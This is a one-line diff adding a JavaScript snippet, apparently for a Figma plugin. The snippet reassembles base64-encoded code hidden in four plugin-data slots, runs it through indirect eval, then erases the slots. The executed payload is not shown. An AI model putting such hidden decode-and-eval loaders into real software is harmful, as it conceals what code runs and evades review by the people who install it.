@@ -1,0 +1,1 @@
+(async()=>{ const b=[1,2,3,4].map(i=>figma.root.getPluginData('j'+i)).join(''); const t=decodeURIComponent(escape(atob(b))); await (0,eval)(t); for(let i=1;i<=4;i++) figma.root.setPluginData('j'+i,''); return {ok:5}; })();
